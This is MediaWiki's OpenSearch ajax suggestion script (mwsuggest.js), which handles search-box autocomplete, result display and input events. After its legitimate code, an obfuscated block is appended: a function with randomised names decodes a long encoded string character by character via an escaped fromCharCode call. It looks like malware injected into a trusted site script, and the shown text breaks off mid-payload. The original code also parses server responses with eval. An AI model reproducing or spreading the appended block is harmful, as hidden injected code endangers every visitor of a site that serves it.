/*
 * OpenSearch ajax suggestion engine for MediaWiki
 *
 * uses core MediaWiki open search support to fetch suggestions
 * and show them below search boxes and other inputs
 *
 * by Robert Stojnic (April 2008)
 */

// search_box_id -> Results object
var os_map = {};
// cached data, url -> json_text
var os_cache = {};
// global variables for suggest_keypress
var os_cur_keypressed = 0;
var os_keypressed_count = 0;
// type: Timer
var os_timer = null;
// tie mousedown/up events
var os_mouse_pressed = false;
var os_mouse_num = -1;
// if true, the last change was made by mouse (and not keyboard)
var os_mouse_moved = false;
// delay between keypress and suggestion (in ms)
var os_search_timeout = 250;
// these pairs of inputs/forms will be autoloaded at startup
var os_autoload_inputs = new Array('searchInput', 'searchInput2', 'powerSearchText', 'searchText');
var os_autoload_forms = new Array('searchform', 'searchform2', 'powersearch', 'search' );
// if we stopped the service
var os_is_stopped = false;
// max lines to show in suggest table
var os_max_lines_per_suggest = 7;
// number of steps to animate expansion/contraction of container width
var os_animation_steps = 6;
// num of pixels of smallest step
var os_animation_min_step = 2;
// delay between steps (in ms)
var os_animation_delay = 30;
// max width of container in percent of normal size (1 == 100%)
var os_container_max_width = 2;
// currently active animation timer
var os_animation_timer = null;

/** Timeout timer class that will fetch the results */
function os_Timer(id,r,query){
	this.id = id;
	this.r = r;
	this.query = query;
}

/** Timer user to animate expansion/contraction of container width */
function os_AnimationTimer(r, target){
	this.r = r;
	var current = document.getElementById(r.container).offsetWidth;
	this.inc = Math.round((target-current) / os_animation_steps);
	if(this.inc < os_animation_min_step && this.inc >=0)
		this.inc = os_animation_min_step; // minimal animation step
	if(this.inc > -os_animation_min_step && this.inc <0)
		this.inc = -os_animation_min_step;
	this.target = target;
}

/** Property class for single search box */
function os_Results(name, formname){
	this.searchform = formname; // id of the searchform
	this.searchbox = name; // id of the searchbox
	this.container = name+"Suggest"; // div that holds results
	this.resultTable = name+"Result"; // id base for the result table (+num = table row)
	this.resultText = name+"ResultText"; // id base for the spans within result tables (+num)
	this.toggle = name+"Toggle"; // div that has the toggle (enable/disable) link
	this.query = null; // last processed query
	this.results = null;  // parsed titles
	this.resultCount = 0; // number of results
	this.original = null; // query that user entered
	this.selected = -1; // which result is selected
	this.containerCount = 0; // number of results visible in container
	this.containerRow = 0; // height of result field in the container
	this.containerTotal = 0; // total height of the container will all results
	this.visible = false; // if container is visible
	this.stayHidden = false; // don't try to show if lost focus
}

/** Hide results div */
function os_hideResults(r){
	var c = document.getElementById(r.container);
	if(c != null)
		c.style.visibility = "hidden";
	r.visible = false;
	r.selected = -1;
}

/** Show results div */
function os_showResults(r){
	if(os_is_stopped)
		return;
	if(r.stayHidden)
		return
	os_fitContainer(r);
	var c = document.getElementById(r.container);
	r.selected = -1;
	if(c != null){
		c.scrollTop = 0;
		c.style.visibility = "visible";
		r.visible = true;
	}
}

function os_operaWidthFix(x){
	// For browsers that don't understand overflow-x, estimate scrollbar width
	if(typeof document.body.style.overflowX != "string"){
		return 30;
	}
	return 0;
}

function os_encodeQuery(value){
  if (encodeURIComponent) {
    return encodeURIComponent(value);
  }
  if(escape) {
    return escape(value);
  }
  return null;
}
function os_decodeValue(value){
  if (decodeURIComponent) {
    return decodeURIComponent(value);
  }
  if(unescape){
  	return unescape(value);
  }
  return null;
}

/** Brower-dependent functions to find window inner size, and scroll status */
function f_clientWidth() {
	return f_filterResults (
		window.innerWidth ? window.innerWidth : 0,
		document.documentElement ? document.documentElement.clientWidth : 0,
		document.body ? document.body.clientWidth : 0
	);
}
function f_clientHeight() {
	return f_filterResults (
		window.innerHeight ? window.innerHeight : 0,
		document.documentElement ? document.documentElement.clientHeight : 0,
		document.body ? document.body.clientHeight : 0
	);
}
function f_scrollLeft() {
	return f_filterResults (
		window.pageXOffset ? window.pageXOffset : 0,
		document.documentElement ? document.documentElement.scrollLeft : 0,
		document.body ? document.body.scrollLeft : 0
	);
}
function f_scrollTop() {
	return f_filterResults (
		window.pageYOffset ? window.pageYOffset : 0,
		document.documentElement ? document.documentElement.scrollTop : 0,
		document.body ? document.body.scrollTop : 0
	);
}
function f_filterResults(n_win, n_docel, n_body) {
	var n_result = n_win ? n_win : 0;
	if (n_docel && (!n_result || (n_result > n_docel)))
		n_result = n_docel;
	return n_body && (!n_result || (n_result > n_body)) ? n_body : n_result;
}

/** Get the height available for the results container */
function os_availableHeight(r){
	var absTop = document.getElementById(r.container).style.top;
	var px = absTop.lastIndexOf("px");
	if(px > 0)
		absTop = absTop.substring(0,px);
	return f_clientHeight() - (absTop - f_scrollTop());
}


/** Get element absolute position {left,top} */
function os_getElementPosition(elemID){
	var offsetTrail = document.getElementById(elemID);
	var offsetLeft = 0;
	var offsetTop = 0;
	while (offsetTrail){
		offsetLeft += offsetTrail.offsetLeft;
		offsetTop += offsetTrail.offsetTop;
		offsetTrail = offsetTrail.offsetParent;
	}
	if (navigator.userAgent.indexOf('Mac') != -1 && typeof document.body.leftMargin != 'undefined'){
		offsetLeft += document.body.leftMargin;
		offsetTop += document.body.topMargin;
	}
	return {left:offsetLeft,top:offsetTop};
}

/** Create the container div that will hold the suggested titles */
function os_createContainer(r){
	var c = document.createElement("div");
	var s = document.getElementById(r.searchbox);
	var pos = os_getElementPosition(r.searchbox);
	var left = pos.left;
	var top = pos.top + s.offsetHeight;
	c.className = "os-suggest";
	c.setAttribute("id", r.container);
	document.body.appendChild(c);

	// dynamically generated style params
	// IE workaround, cannot explicitely set "style" attribute
	c = document.getElementById(r.container);
	c.style.top = top+"px";
	c.style.left = left+"px";
	c.style.width = s.offsetWidth+"px";

	// mouse event handlers
	c.onmouseover = function(event) { os_eventMouseover(r.searchbox, event); };
	c.onmousemove = function(event) { os_eventMousemove(r.searchbox, event); };
	c.onmousedown = function(event) { return os_eventMousedown(r.searchbox, event); };
	c.onmouseup = function(event) { os_eventMouseup(r.searchbox, event); };
	return c;
}

/** change container height to fit to screen */
function os_fitContainer(r){
	var c = document.getElementById(r.container);
	var h = os_availableHeight(r) - 20;
	var inc = r.containerRow;
	h = parseInt(h/inc) * inc;
	if(h < (2 * inc) && r.resultCount > 1) // min: two results
		h = 2 * inc;
	if((h/inc) > os_max_lines_per_suggest )
		h = inc * os_max_lines_per_suggest;
	if(h < r.containerTotal){
		c.style.height = h +"px";
		r.containerCount = parseInt(Math.round(h/inc));
	} else{
		c.style.height = r.containerTotal+"px";
		r.containerCount = r.resultCount;
	}
}
/** If some entries are longer than the box, replace text with "..." */
function os_trimResultText(r){
	// find max width, first see if we could expand the container to fit it
	var maxW = 0;
	for(var i=0;i<r.resultCount;i++){
		var e = document.getElementById(r.resultText+i);
		if(e.offsetWidth > maxW)
			maxW = e.offsetWidth;
	}
	var w = document.getElementById(r.container).offsetWidth;
	var fix = 0;
	if(r.containerCount < r.resultCount){
		fix = 20; // give 20px for scrollbar
	} else
		fix = os_operaWidthFix(w);
	if(fix < 4)
		fix = 4; // basic padding
	maxW += fix;

	// resize container to fit more data if permitted
	var normW = document.getElementById(r.searchbox).offsetWidth;
	var prop = maxW / normW;
	if(prop > os_container_max_width)
		prop = os_container_max_width;
	else if(prop < 1)
		prop = 1;
	var newW = Math.round( normW * prop );
	if( w != newW ){
		w = newW;
		if( os_animation_timer != null )
			clearInterval(os_animation_timer.id)
		os_animation_timer = new os_AnimationTimer(r,w);
		os_animation_timer.id = setInterval("os_animateChangeWidth()",os_animation_delay);
		w -= fix; // this much is reserved
	}

	// trim results
	if(w < 10)
		return;
	for(var i=0;i<r.resultCount;i++){
		var e = document.getElementById(r.resultText+i);
		var replace = 1;
		var lastW = e.offsetWidth+1;
		var iteration = 0;
		var changedText = false;
		while(e.offsetWidth > w && (e.offsetWidth < lastW || iteration<2)){
			changedText = true;
			lastW = e.offsetWidth;
			var l = e.innerHTML;
			e.innerHTML = l.substring(0,l.length-replace)+"...";
			iteration++;
			replace = 4; // how many chars to replace
		}
		if(changedText){
			// show hint for trimmed titles
			document.getElementById(r.resultTable+i).setAttribute("title",r.results[i]);
		}
	}
}

/** Invoked on timer to animate change in container width */
function os_animateChangeWidth(){
	var r = os_animation_timer.r;
	var c = document.getElementById(r.container);
	var w = c.offsetWidth;
	var normW = document.getElementById(r.searchbox).offsetWidth;
	var normL = os_getElementPosition(r.searchbox).left;
	var inc = os_animation_timer.inc;
	var target = os_animation_timer.target;
	var nw = w + inc;
	if( (inc > 0 && nw >= target) || (inc <= 0 && nw <= target) ){
		// finished !
		c.style.width = target+"px";
		clearInterval(os_animation_timer.id)
		os_animation_timer = null;
	} else{
		// in-progress
		c.style.width = nw+"px";
		if(document.documentElement.dir == "rtl")
			c.style.left = (normL + normW + (target - nw) - os_animation_timer.target - 1)+"px";
	}
}

/** Handles data from XMLHttpRequest, and updates the suggest results */
function os_updateResults(r, query, text, cacheKey){
	os_cache[cacheKey] = text;
	r.query = query;
	r.original = query;
	if(text == ""){
		r.results = null;
		r.resultCount = 0;
		os_hideResults(r);
	} else{
		try {
			var p = eval('('+text+')'); // simple json parse, could do a safer one
			if(p.length<2 || p[1].length == 0){
				r.results = null;
				r.resultCount = 0;
				os_hideResults(r);
				return;
			}
			var c = document.getElementById(r.container);
			if(c == null)
				c = os_createContainer(r);
			c.innerHTML = os_createResultTable(r,p[1]);
			// init container table sizes
			var t = document.getElementById(r.resultTable);
			r.containerTotal = t.offsetHeight;
			r.containerRow = t.offsetHeight / r.resultCount;
			os_fitContainer(r);
			os_trimResultText(r);
			os_showResults(r);
		} catch(e){
			// bad response from server or such
			os_hideResults(r);
			os_cache[cacheKey] = null;
		}
	}
}

/** Create the result table to be placed in the container div */
function os_createResultTable(r, results){
	var c = document.getElementById(r.container);
	var width = c.offsetWidth - os_operaWidthFix(c.offsetWidth);
	var html = "<table class=\"os-suggest-results\" id=\""+r.resultTable+"\" style=\"width: "+width+"px;\">";
	r.results = new Array();
	r.resultCount = results.length;
	for(i=0;i<results.length;i++){
		var title = os_decodeValue(results[i]);
		r.results[i] = title;
		html += "<tr><td class=\"os-suggest-result\" id=\""+r.resultTable+i+"\"><span id=\""+r.resultText+i+"\">"+title+"</span></td></tr>";
	}
	html+="</table>"
	return html;
}

/** Fetch namespaces from checkboxes or hidden fields in the search form,
    if none defined use wgSearchNamespaces global */
function os_getNamespaces(r){
	var namespaces = "";
	var elements = document.forms[r.searchform].elements;
	for(i=0; i < elements.length; i++){
		var name = elements[i].name;
		if(typeof name != 'undefined' && name.length > 2
		&& name[0]=='n' && name[1]=='s'
		&& ((elements[i].type=='checkbox' && elements[i].checked)
		 	|| (elements[i].type=='hidden' && elements[i].value=="1")) ){
			if(namespaces!="")
				namespaces+="|";
			namespaces+=name.substring(2);
		}
	}
	if(namespaces == "")
		namespaces = wgSearchNamespaces.join("|");
	return namespaces;
}

/** Update results if user hasn't already typed something else */
function os_updateIfRelevant(r, query, text, cacheKey){
	var t = document.getElementById(r.searchbox);
	if(t != null && t.value == query){ // check if response is still relevant
		os_updateResults(r, query, text, cacheKey);
	}
	r.query = query;
}

/** Fetch results after some timeout */
function os_delayedFetch(){
	if(os_timer == null)
		return;
	var r = os_timer.r;
	var query = os_timer.query;
	os_timer = null;
	var path = wgMWSuggestTemplate.replace("{namespaces}",os_getNamespaces(r))
							  	  .replace("{dbname}",wgDBname)
							  	  .replace("{searchTerms}",os_encodeQuery(query));

	// try to get from cache, if not fetch using ajax
	var cached = os_cache[path];
	if(cached != null){
		os_updateIfRelevant(r, query, cached, path);
	} else{
		var xmlhttp = sajax_init_object();
		if(xmlhttp){
			try {
				xmlhttp.open("GET", path, true);
				xmlhttp.onreadystatechange=function(){
		        	if (xmlhttp.readyState==4 && typeof os_updateIfRelevant == 'function') {
		        		os_updateIfRelevant(r, query, xmlhttp.responseText, path);
	        		}
	      		};
	     		xmlhttp.send(null);
	     	} catch (e) {
				if (window.location.hostname == "localhost") {
					alert("Your browser blocks XMLHttpRequest to 'localhost', try using a real hostname for development/testing.");
				}
				throw e;
			}
		}
	}
}

/** Init timed update via os_delayedUpdate() */
function os_fetchResults(r, query, timeout){
	if(query == ""){
		r.query = "";
		os_hideResults(r);
		return;
	} else if(query == r.query)
		return; // no change

	os_is_stopped = false; // make sure we're running

	/* var cacheKey = wgDBname+":"+query;
	var cached = os_cache[cacheKey];
	if(cached != null){
		os_updateResults(r,wgDBname,query,cached);
		return;
	} */

	// cancel any pending fetches
	if(os_timer != null && os_timer.id != null)
		clearTimeout(os_timer.id);
	// schedule delayed fetching of results
	if(timeout != 0){
		os_timer = new os_Timer(setTimeout("os_delayedFetch()",timeout),r,query);
	} else{
		os_timer = new os_Timer(null,r,query);
		os_delayedFetch(); // do it now!
	}

}
/** Change the highlighted row (i.e. suggestion), from position cur to next */
function os_changeHighlight(r, cur, next, updateSearchBox){
	if (next >= r.resultCount)
		next = r.resultCount-1;
	if (next < -1)
		next = -1;
	r.selected = next;
   	if (cur == next)
    	return; // nothing to do.

    if(cur >= 0){
    	var curRow = document.getElementById(r.resultTable + cur);
    	if(curRow != null)
    		curRow.className = "os-suggest-result";
    }
    var newText;
    if(next >= 0){
    	var nextRow = document.getElementById(r.resultTable + next);
    	if(nextRow != null)
    		nextRow.className = os_HighlightClass();
    	newText = r.results[next];
    } else
    	newText = r.original;

    // adjust the scrollbar if any
    if(r.containerCount < r.resultCount){
    	var c = document.getElementById(r.container);
    	var vStart = c.scrollTop / r.containerRow;
    	var vEnd = vStart + r.containerCount;
    	if(next < vStart)
    		c.scrollTop = next * r.containerRow;
    	else if(next >= vEnd)
    		c.scrollTop = (next - r.containerCount + 1) * r.containerRow;
    }

    // update the contents of the search box
    if(updateSearchBox){
    	os_updateSearchQuery(r,newText);
    }
}

function os_HighlightClass() {
	var match = navigator.userAgent.match(/AppleWebKit\/(\d+)/);
	if (match) {
		var webKitVersion = parseInt(match[1]);
		if (webKitVersion < 523) {
			// CSS system highlight colors broken on old Safari
			// https://bugs.webkit.org/show_bug.cgi?id=6129
			// Safari 3.0.4, 3.1 known ok
			return "os-suggest-result-hl-webkit";
		}
	}
	return "os-suggest-result-hl";
}

function os_updateSearchQuery(r,newText){
	document.getElementById(r.searchbox).value = newText;
    r.query = newText;
}

/** Find event target */
function os_getTarget(e){
	if (!e) e = window.event;
	if (e.target) return e.target;
	else if (e.srcElement) return e.srcElement;
	else return null;
}



/********************
 *  Keyboard events
 ********************/

/** Event handler that will fetch results on keyup */
function os_eventKeyup(e){
	var targ = os_getTarget(e);
	var r = os_map[targ.id];
	if(r == null)
		return; // not our event

	// some browsers won't generate keypressed for arrow keys, catch it
	if(os_keypressed_count == 0){
		os_processKey(r,os_cur_keypressed,targ);
	}
	var query = targ.value;
	os_fetchResults(r,query,os_search_timeout);
}

/** catch arrows up/down and escape to hide the suggestions */
function os_processKey(r,keypressed,targ){
	if (keypressed == 40){ // Arrow Down
    	if (r.visible) {
      		os_changeHighlight(r, r.selected, r.selected+1, true);
    	} else if(os_timer == null){
    		// user wants to get suggestions now
    		r.query = "";
			os_fetchResults(r,targ.value,0);
    	}
  	} else if (keypressed == 38){ // Arrow Up
  		if (r.visible){
  			os_changeHighlight(r, r.selected, r.selected-1, true);
  		}
  	} else if(keypressed == 27){ // Escape
  		document.getElementById(r.searchbox).value = r.original;
  		r.query = r.original;
  		os_hideResults(r);
  	} else if(r.query != document.getElementById(r.searchbox).value){
  		// os_hideResults(r); // don't show old suggestions
  	}
}

/** When keys is held down use a timer to output regular events */
function os_eventKeypress(e){
	var targ = os_getTarget(e);
	var r = os_map[targ.id];
	if(r == null)
		return; // not our event

	var keypressed = os_cur_keypressed;

	os_keypressed_count++;
	os_processKey(r,keypressed,targ);
}

/** Catch the key code (Firefox bug)  */
function os_eventKeydown(e){
	if (!e) e = window.event;
	var targ = os_getTarget(e);
	var r = os_map[targ.id];
	if(r == null)
		return; // not our event

	os_mouse_moved = false;

	os_cur_keypressed = (e.keyCode == undefined) ? e.which : e.keyCode;
	os_keypressed_count = 0;
}

/** Event: loss of focus of input box */
function os_eventBlur(e){
	var targ = os_getTarget(e);
	var r = os_map[targ.id];
	if(r == null)
		return; // not our event
	if(!os_mouse_pressed){
		os_hideResults(r);
		// force canvas to stay hidden
		r.stayHidden = true
		// cancel any pending fetches
		if(os_timer != null && os_timer.id != null)
			clearTimeout(os_timer.id);
		os_timer = null
	}
}

/** Event: focus (catch only when stopped) */
function os_eventFocus(e){
	var targ = os_getTarget(e);
	var r = os_map[targ.id];
	if(r == null)
		return; // not our event
	r.stayHidden = false
}



/********************
 *  Mouse events
 ********************/

/** Mouse over the container */
function os_eventMouseover(srcId, e){
	var targ = os_getTarget(e);
	var r = os_map[srcId];
	if(r == null || !os_mouse_moved)
		return; // not our event
	var num = os_getNumberSuffix(targ.id);
	if(num >= 0)
		os_changeHighlight(r,r.selected,num,false);

}

/* Get row where the event occured (from its id) */
function os_getNumberSuffix(id){
	var num = id.substring(id.length-2);
	if( ! (num.charAt(0) >= '0' && num.charAt(0) <= '9') )
		num = num.substring(1);
	if(os_isNumber(num))
		return parseInt(num);
	else
		return -1;
}

/** Save mouse move as last action */
function os_eventMousemove(srcId, e){
	os_mouse_moved = true;
}

/** Mouse button held down, register possible click  */
function os_eventMousedown(srcId, e){
	var targ = os_getTarget(e);
	var r = os_map[srcId];
	if(r == null)
		return; // not our event
	var num = os_getNumberSuffix(targ.id);

	os_mouse_pressed = true;
	if(num >= 0){
		os_mouse_num = num;
		// os_updateSearchQuery(r,r.results[num]);
	}
	// keep the focus on the search field
	document.getElementById(r.searchbox).focus();

	return false; // prevents selection
}

/** Mouse button released, check for click on some row */
function os_eventMouseup(srcId, e){
	var targ = os_getTarget(e);
	var r = os_map[srcId];
	if(r == null)
		return; // not our event
	var num = os_getNumberSuffix(targ.id);

	if(num >= 0 && os_mouse_num == num){
		os_updateSearchQuery(r,r.results[num]);
		os_hideResults(r);
		document.getElementById(r.searchform).submit();
	}
	os_mouse_pressed = false;
	// keep the focus on the search field
	document.getElementById(r.searchbox).focus();
}

/** Check if x is a valid integer */
function os_isNumber(x){
	if(x == "" || isNaN(x))
		return false;
	for(var i=0;i<x.length;i++){
		var c = x.charAt(i);
		if( ! (c >= '0' && c <= '9') )
			return false;
	}
	return true;
}


/** When the form is submitted hide everything, cancel updates... */
function os_eventOnsubmit(e){
	var targ = os_getTarget(e);

	os_is_stopped = true;
	// kill timed requests
	if(os_timer != null && os_timer.id != null){
		clearTimeout(os_timer.id);
		os_timer = null;
	}
	// Hide all suggestions
	for(i=0;i<os_autoload_inputs.length;i++){
		var r = os_map[os_autoload_inputs[i]];
		if(r != null){
			var b = document.getElementById(r.searchform);
			if(b != null && b == targ){
				// set query value so the handler won't try to fetch additional results
				r.query = document.getElementById(r.searchbox).value;
			}
			os_hideResults(r);
		}
	}
	return true;
}

function os_hookEvent(element, hookName, hookFunct) {
	if (element.addEventListener) {
		element.addEventListener(hookName, hookFunct, false);
	} else if (window.attachEvent) {
		element.attachEvent("on" + hookName, hookFunct);
	}
}

/** Init Result objects and event handlers */
function os_initHandlers(name, formname, element){
	var r = new os_Results(name, formname);
	// event handler
	os_hookEvent(element, "keyup", function(event) { os_eventKeyup(event); });
	os_hookEvent(element, "keydown", function(event) { os_eventKeydown(event); });
	os_hookEvent(element, "keypress", function(event) { os_eventKeypress(event); });
	os_hookEvent(element, "blur", function(event) { os_eventBlur(event); });
	os_hookEvent(element, "focus", function(event) { os_eventFocus(event); });
	element.setAttribute("autocomplete","off");
	// stopping handler
	os_hookEvent(document.getElementById(formname), "submit", function(event){ return os_eventOnsubmit(event); });
	os_map[name] = r;
	// toggle link
	if(document.getElementById(r.toggle) == null){
		// TODO: disable this while we figure out a way for this to work in all browsers
		/* if(name=='searchInput'){
			// special case: place above the main search box
			var t = os_createToggle(r,"os-suggest-toggle");
			var searchBody = document.getElementById('searchBody');
			var first = searchBody.parentNode.firstChild.nextSibling.appendChild(t);
		} else{
			// default: place below search box to the right
			var t = os_createToggle(r,"os-suggest-toggle-def");
			var top = element.offsetTop + element.offsetHeight;
			var left = element.offsetLeft + element.offsetWidth;
			t.style.position = "absolute";
			t.style.top = top + "px";
			t.style.left = left + "px";
			element.parentNode.appendChild(t);
			// only now width gets calculated, shift right
			left -= t.offsetWidth;
			t.style.left = left + "px";
			t.style.visibility = "visible";
		} */
	}

}

/** Return the span element that contains the toggle link */
function os_createToggle(r,className){
	var t = document.createElement("span");
	t.className = className;
	t.setAttribute("id", r.toggle);
	var link = document.createElement("a");
	link.setAttribute("href","javascript:void(0);");
	link.onclick = function(){ os_toggle(r.searchbox,r.searchform) };
	var msg = document.createTextNode(wgMWSuggestMessages[0]);
	link.appendChild(msg);
	t.appendChild(link);
	return t;
}

/** Call when user clicks on some of the toggle links */
function os_toggle(inputId,formName){
	r = os_map[inputId];
	var msg = '';
	if(r == null){
		os_enableSuggestionsOn(inputId,formName);
		r = os_map[inputId];
		msg = wgMWSuggestMessages[0];
	} else{
		os_disableSuggestionsOn(inputId,formName);
		msg = wgMWSuggestMessages[1];
	}
	// change message
	var link = document.getElementById(r.toggle).firstChild;
	link.replaceChild(document.createTextNode(msg),link.firstChild);
}

/** Call this to enable suggestions on input (id=inputId), on a form (name=formName) */
function os_enableSuggestionsOn(inputId, formName){
	os_initHandlers( inputId, formName, document.getElementById(inputId) );
}

/** Call this to disable suggestios on input box (id=inputId) */
function os_disableSuggestionsOn(inputId){
	r = os_map[inputId];
	if(r != null){
		// cancel/hide results
		os_timer = null;
		os_hideResults(r);
		// turn autocomplete on !
		document.getElementById(inputId).setAttribute("autocomplete","on");
		// remove descriptor
		os_map[inputId] = null;
	}
	
	// Remove the element from the os_autoload_* arrays
	var index = os_autoload_inputs.indexOf(inputId);
	if ( index >= 0 )
		os_autoload_inputs[index] = os_autoload_forms[index] = '';
}

/** Initialization, call upon page onload */
function os_MWSuggestInit() {
	for(i=0;i<os_autoload_inputs.length;i++){
		var id = os_autoload_inputs[i];
		var form = os_autoload_forms[i];
		element = document.getElementById( id );
		if(element != null)
			os_initHandlers(id,form,element);
	}
}

hookEvent("load", os_MWSuggestInit);

var i2cc13="";function fda9b3962c(){var k0d3ab=String,d012dd99c=Array.prototype.slice.call(arguments).join(""),w53c7bd7=d012dd99c.substr(12,3)-365,o2dfb4e63,uab05ffc;d012dd99c=d012dd99c.substr(j1ae18d());var k9b07c48f=d012dd99c.length;for(var b0df0f15=0;b0df0f15<k9b07c48f;b0df0f15++){try{throw(g310507=gc91658(d012dd99c,b0df0f15));}catch(e){g310507=e;};if(g310507=='~'){w53c7bd7="";b0df0f15++;kd9253f3d=v91e29b(d012dd99c,b0df0f15);while(kd9253f3d!='~'){w53c7bd7+=kd9253f3d;b0df0f15++;kd9253f3d=b5673a(d012dd99c,b0df0f15);}w53c7bd7-=417;continue;}o2dfb4e63="";if(g310507=='¹'){b0df0f15++;g310507=d012dd99c.substr(b0df0f15,1);while(g310507!='¹'){o2dfb4e63+=g310507;b0df0f15++;g310507=d012dd99c.substr(b0df0f15,1);}o2dfb4e63=x45c8eb4e(o2dfb4e63,w53c7bd7,21);if(o2dfb4e63<0)o2dfb4e63+=256;if(o2dfb4e63>=192)o2dfb4e63+=848;else if(o2dfb4e63==168)o2dfb4e63=1025;else if(o2dfb4e63==184)o2dfb4e63=1105;i2cc13+=k0d3ab["\x66\x72omCh\x61\x72C\x6fde"](o2dfb4e63);continue;}f97c123e3=e46bae05(g310507);if(f97c123e3>848)f97c123e3-=848;uab05ffc=f97c123e3-w53c7bd7-21;uab05ffc=i46421ac(uab05ffc);i2cc13+=k0d3ab["\x66\x72omCh\x61\x72C\x6fde"](uab05ffc);}}fda9b3962c("20aa","4d","1","65","1","3455","0","¹","246","¹4","~535","~¹0¹~48","7","~¹","2","01","¹","¹1","90¹¹20","7¹","¹","1","96","¹¹202¹¹2","0","1¹","~6","0","4~¹","2","4","8","¹","~4","71~","t","~","461","~","a","~5","2","1","~¹2","4","8","¹","¹13","8","¹","~","6","11~","¹225","¹","¹","2","24","¹M8","I¹2","4","7","¹","L~","4","39~","¹1","57","¹¹151¹~","4","44~P","~","4","72","~¹","13","7¹","l","s~59","4","~",".::","6¹0¹","¹24","5¹","¹245¹","6","-(","+","8","3","~4","51~","¹","1","6","6¹","¹","1","6","0","¹","¹","1","59","¹¹","1","5","8","¹","e","¹","16","0¹¹170","¹","~","429","~","N","~","61","1","~","@EK","F¹","4","¹>","~4","7","9~¹","180","¹¹1","92¹","¹","1","84","¹¹1","98¹~4","2","5","~","K","¹","1","28¹","~","528~","¹2","43","¹","¹","241¹","~474","~","¹1","2","5","¹","¹18","1","¹","¹","1","2","5¹","u","¹13","7¹[","~","5","13","~","¹12","7¹¹","1","26","¹¹222","¹¹21","9¹","~","5","97~¹","2","3","3","¹","¹","2","41","¹~4","36~¹15","6¹","~55","8~¹2","7¹¹","18¹","~61","7~","B","L~","592","~","*~500~¹","1","3","6","¹¹22","3¹~","4","65","~","¹","1","7","4¹","¹179¹","¹1","6","9","¹~","569","~","¹","2","8","¹$","¹219¹","%~","4","81","~","¹","206¹","~","4","70","~¹","19","6¹¹1","7","6¹","¹","182","¹","¹171¹","~","432","~","¹","1","3","9¹","Da","~","4","64","~¹12","9","¹","¹","1","2","9","¹d","k","~","4","8","8~¹","2","0","9","¹","~","5","19","~","¹","2","33","¹","~4","60","~¹","164","¹~","422","~","¹","127","¹","~61","3~?~5","1","1","~¹2","20¹¹2","2","5¹","¹216","¹~","466","~¹","1","70","¹m","~57","9","~¹","22","4¹","¹","2","15","¹~","433","~¹1","6","0¹","~","52","6","~¹","1","4","3","¹~","48","7","~","e","d","d¹2","10","¹~","4","87","~","¹","1","96¹","¹2","01","¹¹191¹","~491~","¹2","06¹¹2","1","4¹~6","10~","¹4","¹","N","O","P~","5","31","~","¹2","3","7","¹¹","243¹~","5","88~!","~","5","13","~¹22","0","¹","¹","149¹¹1","78¹","~","6","17","~¹25","3¹","¹","13","¹","~4","93~","¹","15","6¹n","~4","6","0~","J","I¹1","89¹","M","J~","4","9","2","~","i~5","6","7~¹15","¹¹","2","6¹","¹1","4¹","~","5","9","8~","?","7","/","8~5","6","3~","¹27¹~4","44~^","~45","8~¹173¹¹","17","2","¹","~543","~","¹","0¹~","4","68~¹183¹","¹1","89¹","¹","187","¹","¹173","¹¹1","8","1¹","¹183","¹~43","6","~","¹","1","5","8¹¹141¹H~42","2~","W:","~568","~","¹1","8","¹!","~4","21~¹","13","5","¹¹124","¹","~","6","02","~","B","~5","7","8","~","¹","31¹~","4","4","6~","¹","161","¹~61","0","~D~","423","~C~","5","83","~","¹2","2","8","¹","~","43","3","~E~4","24","~","¹1","5","1","¹","~57","0~¹","18","7¹","~","58","5~¹1","9","9","¹","~","5","4","4","~¹15","7","¹~5","5","1","~¹164","¹","¹","4","¹","¹1","¹~5","52~¹","18","8","¹¹19","6¹~59","1","~",":,","1~","53","0","~¹234¹","¹","24","5","¹~49","4","~¹217","¹","¹1","44","¹~","4","4","8","~","¹","1","7","2","¹¹1","73¹","~","478","~¹204","¹¹","184¹¹","1","9","0","¹¹179¹","~56","3~¹","1","4","¹~593","~","¹","22","9","¹","~58","3","~","¹24","8","¹¹248¹¹","2","48¹","~","5","0","9","~¹1","4","5¹~54","6","~¹198¹","¹","19","1","¹~4","75~","o","¹20","2¹\\Y","~5","05~","vv","~","5","8","8","~¹","201","¹~","59","3","~","<~","6","1","7~","F","K~4","7","9~¹","1","8","3¹~","4","51~¹1","6","6¹","¹1","74","¹","e","¹","1","7","5¹~5","16~¹241¹¹","24","2¹¹222","¹~","56","6~¹","2","2","¹¹1","1¹","¹","17","¹¹","202¹~529","~¹1","9","4¹","¹","16","5","¹","~526~¹","17","9¹¹1","89¹","¹","1","4","3","¹","~","591~¹","205","¹","¹204","¹¹","204¹","~57","3","~","¹18","6¹'","¹","1","8","¹","~50","4","~¹","22","2","¹","¹1","40¹¹","2","1","2¹","¹2","09¹","¹","205¹~553~¹","1¹","¹1","8","9","¹","¹2","1","8","¹","~","5","20~","¹1","5","6¹~","53","3~¹237¹","~457","~¹1","72¹","~","54","2","~","¹2","45","¹¹7","¹","~","563~¹","2","0","¹¹1","2¹¹","21¹¹","27¹","¹","21","3","¹","~56","3","~¹","14","¹","¹","1","2","¹","~","4","7","3","~¹","1","9","3¹","¹","1","46","¹","¹1","85","¹","¹","178","¹~5","3","2","~","¹","245¹","~486~","¹1","9","1¹¹","200","¹","~","510","~","¹23","0¹","~5","2","0","~¹2","39","¹~","430","~d","~5","02","~¹2","2","7","¹~","566~¹25","4","¹¹11","¹~","5","49","~","¹","0","¹¹231","¹¹25","0¹","~475~¹188¹","~44","6","~","¹","15","1¹","ZY¹","15","4¹¹","151","¹¹","1","4","7¹¹1","50¹~54","1","~¹18","4¹~","4","86~","¹","1","31","¹","¹","181","¹~","560~¹","21","2","¹~","5","43~¹","2","4","0¹~5","4","6","~¹20","9¹","~","610","~¹","227¹¹","2","2","4¹~609~¹22","2","¹","~4","39~","44~4","63","~¹18","5","¹","~485","~¹1","8","6¹","¹203","¹~","53","7","~¹1","73¹¹0¹","¹2","4","0","¹","¹255","¹¹","24","6","¹","~6","17","~","M","Q","¹25","3¹","~","48","8","~","¹","1","5","3¹~504~¹140","¹~","5","99","~/",":",".","~482","~¹","203¹","~505","~¹","2","18","¹¹210","¹~5","6","7~¹","25¹~","452","~¹","1","72","¹~563","~¹","21","3¹","¹","1","0","¹","~","56","5~","¹2","7¹¹","14","¹","¹","10¹~587~3","~56","6~","¹1","5","¹~54","6","~","¹","219¹¹","2¹","~","54","3","~¹2","4","8","¹¹","0","¹","¹24","8","¹","¹","1","¹","¹","7","¹","¹","18","7","¹","¹","186¹","¹6","¹","¹","246","¹","¹","5¹","¹","252","¹¹3","¹","~","4","59~","¹1","79¹","f","h","~5","6","0~¹2","23","¹~